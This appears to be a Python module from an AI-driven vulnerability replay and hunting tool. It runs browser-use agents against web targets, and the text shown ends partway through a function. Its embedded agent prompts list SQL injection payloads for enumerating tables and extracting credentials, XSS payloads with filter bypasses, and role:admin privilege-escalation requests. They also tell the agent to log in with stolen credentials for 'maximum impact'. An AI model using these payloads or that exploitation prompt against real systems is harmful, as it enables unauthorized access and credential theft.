"""
Browser-Use Replayer — DOM-indexed browser automation for vulnerability replay.

Replaces the coordinate-based VisionBrowserReplayer with browser-use's Agent,
which interacts via DOM element indexing. Requires Python 3.11+ and browser-use.
"""
import asyncio
import json
import os
import re
import time
import urllib.parse
from pathlib import Path
from typing import Optional
from datetime import datetime
from loguru import logger

from src.models import (
    ParsedReport, ReplayReport, ReplayResult, ReplayEvidence,
    VulnType, AuthEvidence,
)
from src.auth.auth_manager import AuthManager, AuthSession
from src.browser import DEFAULT_CHROME_ARGS
from src.recon.target_profiler import TargetProfiler
from src.payloads.payload_library import PayloadLibrary
from src.evidence.evidence_chain import EvidenceChain
from src.chain.vuln_chain import create_chain_for_vuln, create_chain_tools
from src.engine.browser_waf_bypass import BrowserWAFBypass, create_waf_bypass_tools
from src.browser.display_manager import DisplayManager


# JS interceptor: monitors fetch/XHR for auth success and data leaks
NETWORK_INTERCEPTOR_JS = """(() => {
    if (window.__resurface) return;
    window.__resurface = { events: [] };
    
    // Suppress credential manager / password save prompts
    if (navigator.credentials) {
        navigator.credentials.store = () => Promise.resolve();
        navigator.credentials.get = () => Promise.resolve(null);
        navigator.credentials.create = () => Promise.resolve(null);
        navigator.credentials.preventSilentAccess = () => Promise.resolve();
    }
    // Override PasswordCredential if it exists
    if (typeof PasswordCredential !== 'undefined') {
        window.PasswordCredential = function() { return {}; };
    }
    const classify = (url, status, text) => {
        if (status === 200 && /login|auth|signin|session/i.test(url) &&
            /token|jwt|session|authenticated|success/i.test(text))
            return 'AUTH_SUCCESS';
        if (status === 200 && /user|admin|api\\/|basket|profile/i.test(url) &&
            text.length > 100 && /email|password|role|admin|secret/i.test(text))
            return 'DATA_LEAK';
        return null;
    };
    const origFetch = window.fetch;
    window.fetch = async function(...a) {
        const r = await origFetch.apply(this, a);
        try {
            const url = typeof a[0] === 'string' ? a[0] : a[0]?.url || '';
            const t = await r.clone().text();
            const type = classify(url, r.status, t);
            if (type) window.__resurface.events.push({type, url, status: r.status, body: t.substring(0,500)});
        } catch(e) {}
        return r;
    };
    const origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, url, ...r) { this.__rUrl = url; return origOpen.call(this, m, url, ...r); };
    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(...a) {
        this.addEventListener('load', function() {
            try {
                const t = (this.responseText||'').substring(0,500);
                const type = classify(this.__rUrl||'', this.status, t);
                if (type) window.__resurface.events.push({type, url: this.__rUrl, status: this.status, body: t});
            } catch(e) {}
        });
        return origSend.apply(this, a);
    };
})();"""


class BrowserUseReplayer:
    """
    Replays browser-based PoCs using the browser-use library.

    browser-use provides an LLM-driven Agent that reads the accessible DOM tree
    and acts on indexed elements — no pixel coordinates or raw screenshots.
    """

    MAX_ACTIONS = 15

    # Playbooks loaded from src/prompts/playbooks/*.md and labs/*.md
    _playbook_cache: dict = None
    _lab_playbook_cache: dict = None

    @classmethod
    def _load_playbooks(cls) -> dict:
        """Load category playbooks from markdown files."""
        if cls._playbook_cache is not None:
            return cls._playbook_cache

        cls._playbook_cache = {}
        playbook_dir = Path(__file__).parent.parent / "prompts" / "playbooks"

        if playbook_dir.exists():
            for md_file in playbook_dir.glob("*.md"):
                vuln_type = md_file.stem
                try:
                    cls._playbook_cache[vuln_type] = md_file.read_text()
                except Exception as e:
                    print(f"Warning: Failed to load playbook {md_file}: {e}")

        return cls._playbook_cache

    @classmethod
    def _load_lab_playbooks(cls) -> dict:
        """Load per-lab playbooks from labs/ subdirectory."""
        if cls._lab_playbook_cache is not None:
            return cls._lab_playbook_cache

        cls._lab_playbook_cache = {}
        lab_dir = Path(__file__).parent.parent / "prompts" / "playbooks" / "labs"

        if lab_dir.exists():
            for md_file in lab_dir.glob("*.md"):
                if md_file.stem == "INDEX":
                    continue
                # Store by filename stem (e.g., "ssrf_basic_ssrf_against_local_server")
                cls._lab_playbook_cache[md_file.stem.lower()] = md_file.read_text()

        return cls._lab_playbook_cache

    @classmethod
    def get_playbook(cls, vuln_type: str, title: str = None, target_url: str = None) -> str:
        """Get playbook for a vulnerability type.
        
        Lab-specific playbooks are ONLY used for PortSwigger targets to avoid
        leaking lab-specific endpoints/patterns to real targets.
        """
        # Only use lab-specific playbooks for PortSwigger Academy targets
        is_portswigger = target_url and "web-security-academy.net" in target_url
        
        if title and is_portswigger:
            lab_playbooks = cls._load_lab_playbooks()
            # Normalize title for matching
            import re
            title_slug = re.sub(r"[^a-z0-9]+", "_", title.lower()).strip("_")
            
            # Search for matching lab playbook
            for key, content in lab_playbooks.items():
                if title_slug in key or key in title_slug:
                    return content
                # Also try partial match on significant words
                title_words = set(title_slug.split("_")) - {"a", "the", "in", "on", "to", "for", "with", "via", "using"}
                key_words = set(key.split("_")) - {"a", "the", "in", "on", "to", "for", "with", "via", "using"}
                if len(title_words & key_words) >= 3:
                    return content

        # Use synthesized playbook if available, else generic category playbook
        playbooks = cls._load_playbooks()
        # Prefer synthesized (trained from labs) over basic generic
        synthesized_key = f"{vuln_type}_synthesized"
        if synthesized_key in playbooks:
            return playbooks[synthesized_key]
        return playbooks.get(vuln_type, playbooks.get("generic", ""))

    def __init__(
        self,
        api_key: str,
        model: str = "meta-llama/llama-4-scout-17b-16e-instruct",
        provider: str = "groq",
        headless: bool = True,
        auth_manager: Optional[AuthManager] = None,
        verbose: bool = False,
        evidence_dir: str = "data/results",
        blind: bool = False,
        max_actions: int = None,
        groq_api_key: str = None,
        claude_api_key: str = None,
        use_cloud: bool = False,
    ):
        self.api_key = api_key
        self.model = model
        self.provider = provider
        self.headless = headless
        self.auth_manager = auth_manager
        self.verbose = verbose
        self.use_cloud = use_cloud
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.blind = blind
        self.max_actions = max_actions or self.MAX_ACTIONS
        self.groq_api_key = groq_api_key or (api_key if provider == "groq" else None)
        self.claude_api_key = claude_api_key or (api_key if provider == "claude" else None)
        self.payload_library = PayloadLibrary()

    # ── LLM Factory ──────────────────────────────────────────────────

    def _create_llm(self):
        """Create the LLM instance for browser-use Agent."""
        import os
        if self.provider == "claude":
            from browser_use.llm import ChatAnthropic
            os.environ["ANTHROPIC_API_KEY"] = self.claude_api_key or ""
            return ChatAnthropic(model=self.model)
        elif self.provider == "groq":
            from browser_use.llm import ChatGroq
            os.environ["GROQ_API_KEY"] = self.groq_api_key or ""
            return ChatGroq(model=self.model)
        elif self.provider == "gemini":
            from browser_use.llm import ChatGoogle
            return ChatGoogle(model=self.model, api_key=self.api_key)
        else:
            raise ValueError(f"Unsupported LLM provider: {self.provider}")

    # ── Prompt Builders ──────────────────────────────────────────────

    def _build_replay_prompt(self, report: ParsedReport, target_url: str) -> str:
        """Build task prompt for guided replay with PoC steps."""
        steps = ""
        for s in report.steps:
            steps += f"{s.order}. {s.description}\n"
            if s.url:     steps += f"   URL: {s.url}\n"
            if s.payload: steps += f"   Payload: {s.payload}\n"
            if s.expected_behavior: steps += f"   Expected: {s.expected_behavior}\n"

        # Look up playbook for this vuln type (lab-specific only for PortSwigger)
        vuln_key = report.vuln_type.value if report.vuln_type else "unknown"
        playbook = self.get_playbook(vuln_key, title=report.title, target_url=target_url)
        if not playbook:
            playbook = (
                "STRATEGY: Follow the steps provided and test for the described vulnerability.\n"
                "Use the appropriate payloads for the vulnerability type.\n"
            )

        prompt = (
            "You are a security tester checking if a known vulnerability still exists.\n\n"
            f"## Vulnerability\n- Type: {report.vuln_type.value}\n- Title: {report.title}\n"
            f"- Description: {report.description}\n\n## Target\n{target_url}\n\n"
            f"## Steps to Reproduce\n{steps or 'No specific steps provided.'}\n\n"
            f"## PLAYBOOK for {vuln_key}\n{playbook}\n\n"
            "## PROOF-BASED VALIDATION\n"
            "You must reach a definitive conclusion with evidence:\n"
            "- Level 1 (NOT VULNERABLE): Payload blocked/encoded — report as FIXED\n"
            "- Level 2 (PARTIAL): Payload present but execution blocked (WAF/CSP) — report with low confidence\n"
            "- Level 3 (VULNERABLE): Vulnerability behavior confirmed — report with high confidence\n"
            "- Level 4 (CRITICAL): Impact demonstrated (data leak, session hijack, etc.) — report immediately\n"
            "When you call report_vulnerability, include: exact payload used, response evidence, and proof level.\n\n"
            "## CREDENTIAL TRACKING\n"
            "- When you create an account or receive credentials, use save_note to WRITE THEM DOWN (e.g. save_note(key='email', value='...'), save_note(key='password', value='...'))\n"
            "- When logging in, use get_note to recall the EXACT credentials you saved. Do NOT guess passwords.\n"
            "- If you register with email test123@example.com and password test123, you MUST login with EXACTLY those values.\n\n"
            "## EFFICIENCY RULES\n"
            "- If an API response already confirms the vulnerability (e.g. role:admin in response), call report_vulnerability IMMEDIATELY — you don't need to complete ALL steps.\n"
            "- The make_request tool response will highlight key findings — read the SUMMARY line.\n"
            "- Be efficient — complete the test in as few steps as possible.\n\n"
            "## FAILURE RECOVERY\n"
            "- If an action fails, READ the error message carefully.\n"
            "- If login says 'Invalid password', you used the wrong password — use get_note to check your saved credentials.\n"
            "- Do NOT create a new account unless necessary — use the one you already created.\n"
            "- Do NOT retry the same action more than twice — try a different approach.\n\n"
            "## UI RULES\n"
            "- After typing in ANY input field, press Enter to submit (don't look for submit buttons)\n"
            "- For login forms: type email first, then password, then press Enter\n"
            "- For search forms: type the payload, then press Enter\n"
            "- AFTER EVERY FORM SUBMISSION: READ the page for errors ('email must be unique', 'already exists', etc.) — if you see an error, ADAPT (use different email, different input)\n"
            "- For registration: use random emails like test<random_digits>@example.com — never reuse common ones\n"
            "- For XSS: if you see your payload HTML rendered in the page, that IS the vulnerability\n"
            "- If you see a popup/cookie consent/welcome banner, dismiss it FIRST before doing anything else\n"
            "- If you see snackbars ('Language changed', 'Registration completed', etc.), click X or ignore them\n"
            "- If you see a 'Change Password', 'Reset Password', or 'Forgot Password' page, CLOSE it or navigate away — do NOT fill it in\n"
            "- If you see tooltips like 'Click for more information', ignore them — stay focused on the vulnerability\n"
            "- Use the report_vulnerability tool when you confirm a finding\n"
        )

        # Append curated payloads if available
        payload_section = self.payload_library.format_for_prompt(report.vuln_type.value)
        if payload_section:
            prompt += "\n" + payload_section + "\n"

        # Append target profile if available
        try:
            profiler = TargetProfiler()
            profile = profiler.profile(target_url)
            if profile.technologies:
                prompt += "\n" + profile.format_for_prompt() + "\n"
        except Exception:
            pass  # Don't let profiling failure break replay

        # Append recon data if available
        prompt = self._inject_recon_data(prompt, target_url, report.vuln_type.value)

        return prompt

    def _build_blind_prompt(self, report: ParsedReport, target_url: str) -> str:
        """Build task prompt for blind mode (no URLs or step details)."""
        # Look up playbook for this vuln type (lab-specific only for PortSwigger)
        vuln_key = report.vuln_type.value if report.vuln_type else "unknown"
        playbook = self.get_playbook(vuln_key, title=report.title, target_url=target_url)
        if not playbook:
            playbook = (
                "STRATEGY: Explore the application and test for the described vulnerability type.\n"
                "Use the appropriate payloads and techniques.\n"
            )

        prompt = (
            "You are a security tester performing a blind assessment.\n\n"
            f"## Vulnerability Type: {report.vuln_type.value}\n"
            f"## Description: {report.description}\n\n"
            f"## Target: {target_url}\n\n"
            f"## PLAYBOOK for {vuln_key}\n{playbook}\n\n"
            "## PROOF-BASED VALIDATION\n"
            "You must prove the vulnerability exists with evidence:\n"
            "- Level 1 (NOT VULNERABLE): Payload blocked/encoded — stop testing this vector\n"
            "- Level 2 (POTENTIAL): Payload injected but blocked by WAF/CSP — try bypass techniques\n"
            "- Level 3 (VULNERABLE): Vulnerability behavior confirmed — report with 0.8+ confidence\n"
            "- Level 4 (CRITICAL): Impact demonstrated (data leak, RCE, etc.) — report with 0.95 confidence\n"
            "Default to skepticism: assume NOT vulnerable until you have proof.\n\n"
            "## FIRST STEPS (do these before anything else):\n"
            "1. Dismiss any cookie consent banners (click 'Accept', 'Me want it!', 'OK', etc.)\n"
            "2. Dismiss any welcome banners or dialogs (click 'Dismiss', 'Close', 'X', etc.)\n"
            "3. Dismiss any notification snackbars ('Language changed', 'Registration completed', etc.) — click X or ignore them\n"
            "4. If you see a 'Change Password', 'Reset Password', or 'Forgot Password' page/panel, CLOSE it or navigate away — do NOT fill it in\n"
            "5. If you see tooltips like 'Click for more information', ignore them\n"
            "6. IGNORE any 'Solved', 'Congratulations', or 'Lab completed' banners — these are from prior tests and don't affect your assessment\n"
            "7. NOW explore the application — do NOT get distracted by non-security UI elements\n\n"
            "## CREDENTIAL TRACKING\n"
            "- When you create an account or receive credentials, use save_note to WRITE THEM DOWN (e.g. save_note(key='email', value='...'), save_note(key='password', value='...'))\n"
            "- When logging in, use get_note to recall the EXACT credentials you saved. Do NOT guess passwords.\n"
            "- If you register with email test123@example.com and password test123, you MUST login with EXACTLY those values.\n\n"
            "## EFFICIENCY RULES\n"
            "- If an API response already confirms the vulnerability (e.g. role:admin in response), call report_vulnerability IMMEDIATELY — you don't need to complete ALL steps.\n"
            "- The make_request tool response will highlight key findings — read the SUMMARY line.\n"
            "- Be efficient — complete the test in as few steps as possible.\n\n"
            "## FAILURE RECOVERY\n"
            "- If an action fails, READ the error message carefully.\n"
            "- If login says 'Invalid password', you used the wrong password — use get_note to check your saved credentials.\n"
            "- Do NOT create a new account unless necessary — use the one you already created.\n"
            "- Do NOT retry the same action more than twice — try a different approach.\n\n"
            "## Testing Strategy:\n"
            "### Phase 1: EXPLORATION (do this first!)\n"
            "- Click on 3-5 different links/products/pages to discover the app's features\n"
            "- Look for: forms, search boxes, URL parameters, dropdowns, comment fields\n"
            "- Note which pages have user input fields relevant to this vuln type\n"
            "- Don't test yet — just explore and understand the app structure\n\n"
            "### Phase 2: TARGETED TESTING\n"
            "1. Go to the most promising page you found in Phase 1\n"
            "2. Find relevant input fields for this vulnerability type\n"
            "3. For SEARCH: click the search ICON first to reveal the input, then type into the input field\n"
            "4. Test with appropriate payloads\n"
            "5. Report findings using the report_vulnerability tool\n\n"
            "## Payloads by type:\n"
            '- XSS: <iframe src="javascript:alert(\'xss\')"> (try this FIRST) or <script>alert(1)</script>\n'
            "- DOM XSS: Check URL parameters — add ?param=<script>alert(1)</script> to URLs, look for params reflected in dropdowns/selects\n"
            "- SQLi: ' OR 1=1-- or ' UNION SELECT NULL--\n"
            "- IDOR: Try sequential IDs (1, 2, 3...) on API endpoints\n\n"
            "## DOM XSS SPECIFIC:\n"
            "- For DOM XSS, you MUST check URL parameters and their reflection in the page\n"
            "- Visit product/item pages — they often have vulnerable URL params\n"
            "- Look at the URL bar for parameters like ?storeId=, ?productId=, ?category=\n"
            "- Inject payloads INTO the URL parameter, then observe if they appear in the DOM\n"
            "- Check <select> dropdowns, <option> values, and JavaScript-rendered content\n\n"
            "## UI RULES:\n"
            "- ALWAYS dismiss popups/banners BEFORE interacting with the app\n"
            "- For search fields: click the search ICON/BUTTON first to open it, then type in the revealed input\n"
            "- After typing a payload, ALWAYS press Enter to submit\n"
            "- BEFORE submitting a form: check for required fields (marked with *, 'required', or red borders). Fill ALL required fields with valid dummy data before injecting payloads.\n"
            "- AFTER EVERY FORM SUBMISSION: READ the page for error messages or success indicators. If you see errors like 'email must be unique', 'already exists', 'invalid input', etc. — ADAPT your approach (use a different email, different payload, etc.)\n"
            "- For registration: ALWAYS use a random email like test<random_numbers>@example.com (e.g. test83719@example.com) — never use common emails like test@example.com\n"
            "- For XSS: if a JavaScript alert dialog appears, that CONFIRMS the vulnerability — report with 0.95 confidence\n"
            "- For XSS: if you see your payload HTML rendered in the page, that IS the vulnerability — report it\n"
            "- Do NOT retry the same action more than twice — if it fails, try a DIFFERENT approach\n"
            "- Use report_vulnerability with confidence 0.9+ when you confirm a finding\n\n"
            "## API TESTING (use make_request tool):\n"
            "- You have a make_request tool that works like Burp Repeater — makes HTTP requests from browser context\n"
            "- It inherits all cookies/JWT from the browser session\n"
            "- For Privilege Escalation: use make_request to POST to registration/user API with extra fields like \"role\":\"admin\"\n"
            "  Example: make_request(url='/api/Users', method='POST', body='{\"email\":\"pwned<RANDOM>@test.com\",\"password\":\"pass123\",\"passwordRepeat\":\"pass123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\":\"q\"},\"securityAnswer\":\"a\"}') — replace <RANDOM> with random digits!\n"
            "- For IDOR: use make_request to GET /api/Users/1, /api/Users/2, etc.\n"
            "- For Info Disclosure: use make_request to GET /api/Users, /rest/admin, etc.\n"
            "- ALWAYS read the response body to verify the exploit worked\n"
            "- If the response contains 'role\":\"admin' or similar elevated data, report as VULNERABLE\n\n"
            "Be methodical. Dismiss banners, explore, find inputs, test payloads, report.\n"
        )

        # Append curated payloads if available
        payload_section = self.payload_library.format_for_prompt(report.vuln_type.value)
        if payload_section:
            prompt += "\n" + payload_section + "\n"

        # Append target profile if available
        try:
            profiler = TargetProfiler()
            profile = profiler.profile(target_url)
            if profile.technologies:
                prompt += "\n" + profile.format_for_prompt() + "\n"
        except Exception:
            pass  # Don't let profiling failure break replay

        # Append recon data if available
        prompt = self._inject_recon_data(prompt, target_url, report.vuln_type.value)

        return prompt

    def _inject_recon_data(self, prompt: str, target_url: str, vuln_type: str) -> str:
        """Inject recon data from ReconResult if available in site cache."""
        try:
            from src.browser.site_cache import SiteCache
            cache = SiteCache()
            data = cache.load(target_url)
            if data and data.get("recon_type") == "llm_agent":
                # Rich recon data exists — build prompt context from it
                sections = ["\n## APPLICATION KNOWLEDGE (from recon agent)"]
                if data.get("auth_flow"):
                    af = data["auth_flow"]
                    sections.append(f"**Auth**: {af.get('auth_type', '?')} at {af.get('login_url', '?')} — {af.get('notes', '')}")
                if data.get("tech_stack"):
                    sections.append(f"**Tech**: {', '.join(data['tech_stack'])}")
                routes = data.get("routes", {})
                if routes:
                    sections.append(f"**Pages ({len(routes)}):**")
                    for route, info in list(routes.items())[:15]:
                        desc = info.get("description", "")[:80]
                        ptype = info.get("page_type", "")
                        forms = info.get("forms", [])
                        form_info = f" | {len(forms)} form(s)" if forms else ""
                        sections.append(f"  - [{ptype}] {route} — {desc}{form_info}")
                        for form in forms[:3]:
                            sections.append(f"    → {form.get('method', '?')} {form.get('action', '?')}: {form.get('fields', '')[:100]}")
                api_eps = data.get("api_endpoints", {})
                if api_eps:
                    sections.append(f"**API Endpoints ({len(api_eps)}):**")
                    for key, info in list(api_eps.items())[:15]:
                        sections.append(f"  - {key} — {info.get('description', '')[:80]}")
                notes = data.get("recon_notes", [])
                security_notes = [n for n in notes if n.get("category") in ("security", "interesting")]
                if security_notes:
                    sections.append("**Security Notes:**")
                    for n in security_notes[:5]:
                        sections.append(f"  - {n['note']}")
                nav = data.get("navigation", [])
                if nav:
                    sections.append(f"**Navigation ({len(nav)}):** " + ", ".join(f"{n['text']}→{n['url']}" for n in nav[:10]))
                sections.append("\nUse this knowledge to go directly to relevant pages — skip exploration.")
                prompt += "\n".join(sections) + "\n"
                logger.info(f"  🗺️  Recon data injected: {len(routes)} pages, {len(api_eps)} APIs")
        except Exception as e:
            logger.debug(f"  Recon data injection skipped: {e}")
        return prompt

    def _build_hunt_prompt(self, target_url: str, vuln_types: list[str], stop_on_find: bool = False) -> str:
        """Build task prompt for autonomous hunt mode."""
        types = "\n".join(f"- {vt}" for vt in vuln_types)
        stop_instruction = (
            "\n\nIMPORTANT: Once you have achieved MAXIMUM IMPACT (extracted credentials, "
            "logged in as admin, or fully demonstrated the vulnerability's worst-case scenario), "
            "call report_vulnerability ONCE with all evidence, then call done() immediately.\n"
            "DO NOT call report_vulnerability multiple times for the same vulnerability.\n"
            if stop_on_find else
            "\n\nBe systematic. Map the app first, then test. Report ALL findings.\n"
            "Call report_vulnerability ONCE per distinct vulnerability — not multiple times for the same one.\n"
        )
        return (
            "You are an autonomous security exploitation agent. Your job is NOT just to detect "
            "vulnerabilities — you must achieve MAXIMUM IMPACT. Finding a vulnerability is step 1. "
            "Extracting sensitive data, stealing credentials, and gaining unauthorized access is the goal.\n\n"
            f"## Target\n{target_url}\n\n"
            f"## Vulnerability Types to Look For\n{types}\n\n"
            "## Exploitation Instructions\n\n"
            "### Phase 1: Reconnaissance\n"
            "- Navigate the target, map all pages, forms, parameters, and endpoints\n"
            "- Identify input vectors (URL params, form fields, headers, cookies)\n"
            "- Look for login pages, admin panels, user management features\n\n"
            "### Phase 2: Detection\n"
            "- Test each input with initial probes to confirm vulnerability exists\n"
            "- Look for error messages, behavioral changes, or anomalous responses\n\n"
            "### Phase 3: FULL EXPLOITATION (critical — do not skip any step)\n"
            "Once you confirm a vulnerability exists, you MUST go ALL THE WAY to maximum impact.\n"
            "DO NOT stop at just confirming the vulnerability exists. DO NOT stop at just extracting "
            "the database version. Keep going until you have extracted real sensitive data.\n\n"
            "**SQL Injection — Full Kill Chain:**\n"
            "  1. Confirm injection with a tautology (e.g. `' OR 1=1--`)\n"
            "  2. Determine column count: `' ORDER BY 1--`, `' ORDER BY 2--`, etc. until error\n"
            "  3. Find displayable columns: `' UNION SELECT NULL,NULL,...--`, replace NULLs with `'abc'`\n"
            "  4. Identify the database type from version:\n"
            "     - `' UNION SELECT version(),NULL--` (PostgreSQL/MySQL)\n"
            "     - `' UNION SELECT banner,NULL FROM v$version--` (Oracle, needs `FROM dual` for simple)\n"
            "     - `' UNION SELECT @@version,NULL--` (MSSQL)\n"
            "  5. **Enumerate tables** (DO NOT SKIP):\n"
            "     - PostgreSQL/MySQL: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`\n"
            "     - If too many results, filter: `...WHERE table_name LIKE '%user%'--` or `LIKE '%login%'` or `LIKE '%account%'`\n"
            "     - Oracle: `' UNION SELECT table_name,NULL FROM all_tables--`\n"
            "  6. **Find the users/credentials table** — look for tables named `users`, `accounts`, `credentials`, `members`, `login`, etc.\n"
            "  7. **Enumerate columns** of the users table (DO NOT SKIP):\n"
            "     - `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME_HERE'--`\n"
            "  8. **Extract credentials** (DO NOT SKIP — this is the goal):\n"
            "     - `' UNION SELECT username,password FROM TABLE_NAME_HERE--`\n"
            "     - If both columns are strings and you have 2 displayable columns, extract both at once\n"
            "     - If only 1 displayable column, concatenate: `' UNION SELECT username||':'||password,NULL FROM TABLE_NAME_HERE--` (PostgreSQL/Oracle)\n"
            "     - MySQL concat: `' UNION SELECT CONCAT(username,':',password),NULL FROM TABLE_NAME_HERE--`\n"
            "  9. **Log in with stolen credentials** (DO NOT SKIP if login page exists):\n"
            "     - Find the login page\n"
            "     - Use the administrator/admin credentials you extracted\n"
            "     - Prove you have access by navigating to admin panels or protected pages\n"
            "  10. For Oracle: use `FROM dual` for queries without a real table, `||` for concat\n"
            "  11. For NULL type mismatches: try `TO_CHAR()` or cast as needed\n\n"
            "**XSS (Cross-Site Scripting):**\n"
            "  1. Confirm reflection/injection point\n"
            "  2. Escalate to actual script execution: get `alert()`, `print()`, or similar to fire\n"
            "  3. If basic `<script>alert(1)</script>` is blocked, try event handlers: "
            "`<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `\"><script>alert(1)</script>`\n"
            "  4. Try encoding bypasses if WAF blocks: HTML entities, URL encoding, case mixing\n\n"
            "**IDOR / Access Control:**\n"
            "  1. Confirm you can access another user's resource\n"
            "  2. Actually retrieve sensitive data (not just a 200 status code)\n"
            "  3. Demonstrate the full impact — show what data was leaked\n\n"
            "**Auth Bypass:**\n"
            "  1. Access protected functionality (admin panel, other user's account)\n"
            "  2. Perform an action that proves access (view data, modify settings)\n\n"
            "### Phase 4: Report (ONE report only)\n"
            "- Only call report_vulnerability ONCE after achieving maximum impact\n"
            "- Include: the full exploit chain, all extracted data (credentials, version, tables), "
            "and whether you successfully logged in\n"
            "- DO NOT report multiple times for the same vulnerability — consolidate everything into ONE report\n"
            "- A report that stops at 'extracted database version' is INCOMPLETE if there are tables with "
            "credentials you haven't extracted yet\n"
            + stop_instruction
        )

    # ── Auth Helpers ─────────────────────────────────────────────────

    def _get_auth_session(self, target_url: str) -> Optional[AuthSession]:
        """Authenticate against the target if an auth profile exists."""
        if not self.auth_manager:
            return None
        try:
            domain = urllib.parse.urlparse(target_url).netloc
            session = self.auth_manager.authenticate(domain)
            if session and session.success:
                logger.info(f"  🔑 Auth: '{session.profile_name}' ({session.auth_type.value})")
                return session
            elif session:
                logger.warning(f"  ⚠️  Auth failed for {domain}")
        except Exception as e:
            logger.warning(f"  ⚠️  Auth error: {e}")
        return None

    async def _inject_auth(self, browser: 'Browser', session: AuthSession, target_url: str) -> AuthEvidence:
        """Inject auth cookies/headers into the browser-use browser via CDP."""
        domain = urllib.parse.urlparse(target_url).hostname or "localhost"
        evidence = AuthEvidence(
            profile_name=session.profile_name, auth_type=session.auth_type.value,
            success=session.success, log=session.log, timestamp=datetime.now(),
        )
        if session.cookies:
            cookies = [{"name": k, "value": v, "domain": domain, "path": "/"} for k, v in session.cookies.items()]
            try:
                await browser._cdp_set_cookies(cookies)
                logger.info(f"  🍪 Injected {len(cookies)} auth cookie(s)")
            except Exception as e:
                logger.warning(f"  Cookie injection failed: {e}")
        if session.authorization:
            logger.info(f"  🔐 Auth token: {session.authorization[:30]}...")
        return evidence

    # ── Evidence Collection ──────────────────────────────────────────

    def _collect_evidence(self, history, report_id: int) -> list[ReplayEvidence]:
        """Extract evidence from browser-use agent's action history."""
        evidence = []
        try:
            for i, result in enumerate(history.action_results(), 1):
                ev = ReplayEvidence(step_number=i, notes=str(result)[:500] if result else "")
                try:
                    screenshots = history.screenshots()
                    if screenshots and i - 1 < len(screenshots):
                        path = self.evidence_dir / f"{report_id}_bu_step{i}.png"
                        path.write_bytes(screenshots[i - 1])
                        ev.screenshot_path = str(path)
                except Exception:
                    pass
                evidence.append(ev)
        except Exception as e:
            logger.debug(f"  Evidence collection: {e}")
        return evidence

    # ── Result Determination ─────────────────────────────────────────

    def _determine_result(
        self, report: ParsedReport, findings: list, dialogs: list,
        network_events: list, evidence: list,
    ) -> tuple[ReplayResult, float, str]:
        """Determine replay result from all collected evidence."""
        analysis = []
        vuln_type = report.vuln_type
        max_conf = 0.0
        vulnerable = False

        # Agent-reported findings
        if findings:
            best = max(findings, key=lambda f: f.get("confidence", 0))
            max_conf = max(max_conf, best["confidence"])
            vulnerable = True
            analysis.append(f"Agent reported {len(findings)} finding(s). Best: {best['vuln_type']} ({best['confidence']:.0%})")

            # High-confidence agent findings — the agent SAW the evidence, trust it
            if best.get("confidence", 0) >= 0.8:
                max_conf = max(max_conf, best["confidence"])
                analysis.append(f"High-confidence agent finding ({best['confidence']:.0%}) — agent observed direct evidence")

            # Privilege escalation boost: if findings mention admin/role, that's strong evidence
            if vuln_type == VulnType.PRIVILEGE_ESCALATION or (vuln_type and vuln_type.value == "privilege_escalation"):
                for f in findings:
                    ev_text = str(f.get("evidence", "")).lower()
                    if any(kw in ev_text for kw in ["admin", "role", "privilege", "elevated"]):
                        max_conf = max(max_conf, 0.95)
                        analysis.append("Privilege escalation keywords in finding evidence — boosted confidence")
                        break

        # JS dialogs → XSS
        xss_types = {VulnType.XSS_REFLECTED, VulnType.XSS_STORED, VulnType.XSS_DOM, VulnType.UNKNOWN}
        if dialogs and vuln_type in xss_types:
            vulnerable = True
            max_conf = max(max_conf, 0.95)
            analysis.append(f"JS dialog(s): {'; '.join(dialogs[:3])} — strong XSS indicator")

        # Network: auth success → SQLi/auth bypass
        auth_evts = [e for e in network_events if e.get("type") == "AUTH_SUCCESS"]
        if auth_evts and vuln_type in {VulnType.SQLI, VulnType.AUTH_BYPASS}:
            vulnerable = True
            max_conf = max(max_conf, 0.85)
            analysis.append(f"Auth success in network ({len(auth_evts)} evt) — SQLi/auth bypass indicator")

        # Network: data leak → IDOR/info disclosure
        leak_evts = [e for e in network_events if e.get("type") == "DATA_LEAK"]
        if leak_evts and vuln_type in {VulnType.IDOR, VulnType.INFO_DISCLOSURE}:
            vulnerable = True
            max_conf = max(max_conf, 0.80)
            analysis.append(f"Data leak in network ({len(leak_evts)} evt) — IDOR/info disclosure indicator")

        if vulnerable:
            return ReplayResult.VULNERABLE, min(max_conf, 1.0), "\n".join(analysis)
        elif evidence:
            return ReplayResult.FIXED, 0.6, "Agent completed without finding the vulnerability"
        else:
            return ReplayResult.INCONCLUSIVE, 0.3, "Insufficient evidence to determine status"

    # ── Async Core ───────────────────────────────────────────────────

    async def _async_replay(
        self, parsed_report: ParsedReport,
        target_override: Optional[str] = None,
        max_actions: Optional[int] = None,
        resume_context: Optional[str] = None,
    ) -> ReplayReport:
        """Async replay: create Agent, inject auth, run, collect evidence."""
        from browser_use import Agent, Browser
        from browser_use.controller import Controller

        max_actions = max_actions or (20 if self.blind else self.max_actions)
        start = time.time()
        rid = parsed_report.report_id
        findings, dialogs = [], []
        auth_evidence = None

        # Initialize evidence chain for structured evidence collection
        vuln_key = parsed_report.vuln_type.value if parsed_report.vuln_type else "unknown"
        evidence_chain = EvidenceChain(
            report_id=rid,
            target_url=target_override or parsed_report.target_url or "",
            vuln_type=vuln_key,
            evidence_dir=str(self.evidence_dir),
        )

        # Initialize vuln chain for multi-step tracking
        vuln_chain = create_chain_for_vuln(vuln_key, target_override or parsed_report.target_url or "")

        logger.info(f"🌐 Browser-Use replay #{rid}: {parsed_report.title[:60]}")
        logger.info(f"  Provider: {self.provider} ({self.model})" + (" | 🙈 BLIND" if self.blind else ""))

        # Resolve target URL and rewrite step URLs if overridden
        target_url = target_override or parsed_report.target_url or ""

        # Pre-flight: check if target is alive
        try:
            import httpx
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                resp = await client.get(target_url)
                logger.info(f"  🌐 Target alive: HTTP {resp.status_code}")
        except httpx.ConnectError as e:
            logger.error(f"  ❌ Target unreachable: {target_url} — {e}")
            return ReplayReport(
                report_id=rid, title=parsed_report.title, target_url=target_url,
